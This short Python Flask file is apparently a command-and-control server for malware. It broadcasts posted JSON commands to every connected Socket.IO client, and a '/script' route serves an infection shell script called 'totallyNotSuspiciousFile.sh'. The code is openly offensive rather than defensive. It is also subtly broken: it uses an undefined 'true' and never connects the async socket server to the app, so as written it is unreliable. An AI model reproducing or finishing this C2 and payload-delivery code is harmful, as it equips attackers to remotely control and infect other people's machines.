from flask import Flask, request, send_file, render_template
import socketio


app = Flask(__name__)
sio = socketio.AsyncServer()
sockets = []

@sio.event
def connect(sid, environ, auth):
    sockets.append(sid)

@sio.event
def disconnect(sid):
    sockets.remove(sid)

@app.route('/', methods=["GET", "POST"])
def command_control():
    print(request.get_json())
    if sockets:
        for s in sockets:
            sio.emit("command", request.get_json(),room=s)
    return "Done"

@app.route('/script', methods=["GET"])
def myscript():
    path= "Infection script/totallyNotSuspiciousFile.sh"
    return send_file(path)

@app.route('/home')
def home():
    return render_template("index.html")

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=true)
